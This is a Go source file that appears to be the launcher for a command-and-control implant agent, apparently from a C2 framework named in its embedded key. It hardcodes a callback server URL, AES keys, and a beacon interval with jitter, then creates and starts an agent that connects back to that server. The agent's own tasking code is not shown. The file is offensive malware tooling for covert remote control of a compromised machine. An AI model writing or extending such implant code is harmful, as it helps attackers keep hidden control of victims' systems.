package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"strconv"
	"time"
)

// Default configuration - will be replaced during build
var (
	defaultServerURL    = "http://192.168.10.102:8080"
	defaultKey          = "SpookyOrcaC2AES1"
	defaultSecondaryKey = "TaburtuaiSecondary"
	defaultInterval     = "5"
	defaultJitter       = "0.1"
)

func main() {
	// Parse configuration
	interval, _ := strconv.Atoi(defaultInterval)
	if interval < 1 {
		interval = 30
	}

	jitter, _ := strconv.ParseFloat(defaultJitter, 64)
	if jitter < 0 || jitter > 1 {
		jitter = 0.3
	}

	config := &Config{
		ServerURL:    defaultServerURL,
		PrimaryKey:   defaultKey,
		SecondaryKey: defaultSecondaryKey,
		Interval:     interval,
		Jitter:       jitter,
	}

	// Create and start agent
	agent, err := NewAgent(config)
	if err != nil {
		fmt.Printf("[!] Failed to create agent: %v\n", err)
		os.Exit(1)
	}

	if err := agent.Start(); err != nil {
		fmt.Printf("[!] Agent failed: %v\n", err)
		os.Exit(1)
	}
}

// generateUUID generates a unique identifier
func generateUUID() string {
	b := make([]byte, 16)
	_, err := rand.Read(b)
	if err != nil {
		// Fallback to timestamp-based UUID
		now := time.Now().UnixNano()
		for i := range b {
			b[i] = byte((now >> (i * 8)) & 0xFF)
		}
	}

	// Set version and variant bits
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80

	return fmt.Sprintf("%x-%x-%x-%x-%x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}
